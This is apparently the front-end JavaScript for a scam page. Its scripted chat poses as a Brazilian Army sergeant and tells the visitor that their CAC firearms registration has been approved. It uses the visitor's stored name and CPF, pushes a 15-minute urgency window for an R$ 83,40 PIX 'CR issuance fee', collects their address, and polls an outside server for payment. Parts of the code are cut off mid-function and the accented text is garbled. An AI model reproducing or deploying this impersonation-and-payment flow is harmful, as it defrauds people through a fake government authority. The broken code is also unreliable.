<script>
// Get customer data from localStorage (saved when accessing via CPF slug)
const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');

// Function to properly capitalize names
function capitalizeNames(name) {
    if (!name) return 'Nome n√£o informado';
    return name.toLowerCase().split(' ').map(word => 
        word.charAt(0).toUpperCase() + word.slice(1)
    ).join(' ');
}

const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Candidato';
const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome n√£o informado';
const cpf = customerData.cpf || 'CPF n√£o informado';

// Chat sequence with CAC approval notification
const chatSequence = [
    {
        message: `Ol√° ${firstName}, aqui √© o Sargento Franklin Ribeiro, do Ex√©rcito Brasileiro. Estou aqui para ajud√°-lo a finalizar seu processo de cadastro.`,
        delay: 3000
    },
    {
        message: `Sua documenta√ß√£o foi analisada e aprovada pelo Comando do Ex√©rcito. Agora falta apenas a √∫ltima etapa: o pagamento da Taxa de Emiss√£o do CR no valor de R$ 83,40.`,
        delay: 10000
    },
    {
        message: `O CR (Certificado de Registro) √© o documento que autoriza voc√™ a comprar armas de fogo, transport√°-las por todo territ√≥rio brasileiro e manter essas armas em sua resid√™ncia de maneira 100% legal.`,
        delay: 10000
    },
    {
        message: '',
        delay: 8000,
        showImage: 'https://shotgunclube.com.br/wp-content/uploads/2022/10/CR.png'
    },
    {
        message: `Agora que voc√™ j√° sabe o que √© o CR, podemos prosseguir com o processo?`,
        delay: 9000,
        showOptions: 'proceedOptions'
    }
];

// Chat container
const chatContainer = document.getElementById('chatContainer');

// Improved scroll function for better mobile experience
function scrollToBottom() {
    setTimeout(() => {
        chatContainer.scrollTop = chatContainer.scrollHeight + 100;
    }, 100);
}

// Add message to chat
function addMessage(text, isIncoming = true, shouldScroll = true) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;

    messageDiv.innerHTML = `
        <div class="message-content">
            ${text.replace(/\n/g, '<br>')}
        </div>
    `;

    chatContainer.appendChild(messageDiv);

    if (shouldScroll) {
        scrollToBottom();
    }
}

// Add image to chat
function addImage(imageUrl, shouldScroll = true) {
    const messageDiv = document.createElement('div');
    messageDiv.className = 'message-bubble incoming-message';

    messageDiv.innerHTML = `
        <div class="message-content" style="padding: 10px; background-color: rgba(0, 70, 40, 0.3); border-top-left-radius: 2px;">
            <img src="${imageUrl}" alt="CR Document" style="width: 100%; max-width: 300px; height: auto; border-radius: 8px;">
        </div>
    `;

    chatContainer.appendChild(messageDiv);

    if (shouldScroll) {
        scrollToBottom();
    }
}

// Show typing indicator
function showTyping(duration = 3000) {
    return new Promise(resolve => {
        const typingDiv = document.createElement('div');
        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
        typingDiv.style.paddingLeft = '0px';
        typingDiv.style.marginLeft = '-10px';
        typingDiv.innerHTML = `
            <div class="message-content d-flex align-items-center" style="background-color: #004628; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
                <div class="typing-animation">
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </div>
            </div>
        `;

        chatContainer.appendChild(typingDiv);
        scrollToBottom();

        setTimeout(() => {
            if (typingDiv.parentNode) {
                typingDiv.parentNode.removeChild(typingDiv);
            }
            resolve();
        }, duration);
    });
}

// Show options
function showOptions(optionsId) {
    let optionsHtml = '';

    if (optionsId === 'proceedOptions') {
        optionsHtml = `
            <div class="chat-options">
                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Sim, podemos prosseguir', 'continueFlow')">
                    <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
                    Sim, podemos prosseguir
                </button>
            </div>
        `;
    } else if (optionsId === 'cacOptions') {
        optionsHtml = `
            <div class="chat-options">
                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou finalizar meu cadastro CAC agora', 'redirectToPayment')">
                    <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
                    Vou finalizar meu cadastro CAC agora
                </button>
                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Quero cancelar minha aprova√ß√£o', 'confirmCancel')">
                    <i class="fas fa-times-circle" style="color: var(--receita-danger);"></i> 
                    Quero cancelar minha aprova√ß√£o
                </button>
            </div>
        `;
    }

    if (optionsHtml) {
        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
        scrollToBottom();
    }
}

// Handle option click
function handleOptionClick(button, responseText, nextAction) {
    // Add user response to chat
    addMessage(responseText, false, true);

    // Remove the options container
    const optionsContainer = button.closest('.chat-options');
    if (optionsContainer) {
        optionsContainer.remove();
    }

    // Show typing and continue conversation
    setTimeout(async () => {
        if (nextAction === 'continueFlow') {
            await showTyping(4000);
            addMessage(`Voc√™ ganhou 2 brindes do Ex√©rcito Brasileiro: uma carteirinha CAC e um distintivo.`, true, true);

            await showTyping(3000);
            addImage('https://www.metalcouro.com.br/arq/pdt/pdt1589_1.jpg', true);

            await showTyping(4000);
            addMessage(`Para a entrega do documento CR, da carteirinha e distintivo, preciso que confirme seu endere√ßo:`, true, true);

            // Show address form
            setTimeout(() => {
                showAddressForm();
            }, 5000);

            // Wait for address confirmation before continuing
            await waitForAddressConfirmation();


            await showTyping(5000);
            addMessage('O pagamento da taxa tem validade de apenas 15 minutos. Assim que realizar vamos finalizar seu Cadastro.', true, true);

            // Show payment button
            setTimeout(() => {
                showPaymentButton();
            }, 2000);
        } else if (nextAction === 'confirmCancel') {
            await showTyping(8000);
            addMessage('Entendido. Sua aprova√ß√£o para o programa CAC ser√° cancelada conforme solicitado. Esta oportunidade n√£o estar√° mais dispon√≠vel. Obrigado pelo contato.', true, true);
        }
    }, 1000);
}

// PIX Modal functionality
async function openPixModal() {
    // Show loading modal first
    showLoadingModal();

    try {
        // Get ALL customer data from localStorage
        const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
        const clientData = {
            telefone: customerData.telefone || '',
            nome: customerData.nome || '',
            cpf: customerData.cpf || ''
        };


        const response = await fetch('/generate-pix', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(clientData)
        });

        const data = await response.json();

        if (data.success && (data.pixCode || data.pix_code)) {
            // Replace loading modal with PIX data
            showPixModal(data);
        } else {
            closePixModal();
            alert('Erro ao gerar PIX. Tente novamente.');
        }
    } catch (error) {
        console.error('Erro:', error);
        closePixModal();
        alert('Erro ao gerar PIX. Tente novamente.');
    }
}

function showPixModal(data) {
    // Remove loading modal and show PIX modal
    const existingModal = document.getElementById('pixModal');

        existingModal.remove();
    }

    let qrCodeData = data.pixQrCode || data.qr_code_image || data.qrCodeBase64;

    if (qrCodeData && qrCodeData.includes('data:image/png;base64,data:image/png;base64,')) {
        qrCodeData = qrCodeData.replace('data:image/png;base64,data:image/png;base64,', 'data:image/png;base64,');

    if (transactionId) {

                    <div style="display: inline-block; padding: 10px; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">

function copyPixCode() {
    // Get the real PIX code from hidden input
    const realPixInput = document.getElementById('pixCodeInputReal');
    const realPixCode = realPixInput.value;

    try {
        // Copy the real PIX code to clipboard
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(realPixCode);
        } else {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = realPixCode;
            document.body.appendChild(textArea);
            textArea.select();
            textArea.setSelectionRange(0, 99999);
            document.execCommand('copy');
            document.body.removeChild(textArea);
        }

        const button = event.target.closest('button');
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> C√≥digo Copiado!';
        button.style.background = '#28a745';

        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '#044785';
        }, 3000);
    } catch (err) {
        console.error('Erro ao copiar:', err);
        alert('Erro ao copiar c√≥digo. Tente selecionar manualmente.');
    }
}

// Payment monitoring function
function startPaymentMonitoring(transactionId) {
    console.log(`üöÄ Iniciando monitoramento para transa√ß√£o: ${transactionId}`);

    // Clear any existing interval
    if (window.paymentMonitorInterval) {
        clearInterval(window.paymentMonitorInterval);
    }

    // Check payment status every 1 second
    window.paymentMonitorInterval = setInterval(async () => {
        try {
            const statusUrl = `https://recoveryfy.replit.app/api/order/${transactionId}/status`;

            const response = await fetch(statusUrl);

            if (!response.ok) {
                console.error(`‚ùå Erro HTTP ${response.status}: ${response.statusText}`);
                return;
            }

            const statusData = await response.json();

            // Check if payment is approved
            if (statusData.status === 'approved' || statusData.status === 'paid') {

                // Clear monitoring
                clearInterval(window.paymentMonitorInterval);
                window.paymentMonitorInterval = null;

                // Close modal
                closePixModal();

                // Redirect immediately to /multa
                window.location.href = '/pagamento';
            }
        } catch (error) {
            console.error('‚ùå Erro ao verificar status do pagamento:', error);
        }
    }, 1000); // Check every 1 second


    // Timeout after 20 minutes (PIX expiration)
    setTimeout(() => {
        if (window.paymentMonitorInterval) {
            clearInterval(window.paymentMonitorInterval);
            window.paymentMonitorInterval = null;
        }
    }, 20 * 60 * 1000); // 20 minutes
}

        await showTyping(message.delay);

        if (message.message) {

        // Show image if specified

// Format CEP input
function formatCEP(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 5) {
        value = value.substring(0, 5) + '-' + value.substring(5, 8);
    }
    input.value = value;
}

// Function to handle manual payment confirmation

    if (popup) popup.remove();
    if (overlay) overlay.remove();

    if (confirmed) {

        try {
            const statusUrl = `https://recoveryfy.replit.app/api/order/${transactionId}/status`;

            const response = await fetch(statusUrl);

            if (!response.ok) {
                console.error(`‚ùå Erro HTTP ${response.status}: ${response.statusText}`);
                return;
            }

            const statusData = await response.json();

            if (statusData.status === 'approved' || statusData.status === 'paid') {

                if (window.paymentMonitorInterval) {

                    window.paymentMonitorInterval = null;

        }
    } else {

    }
}
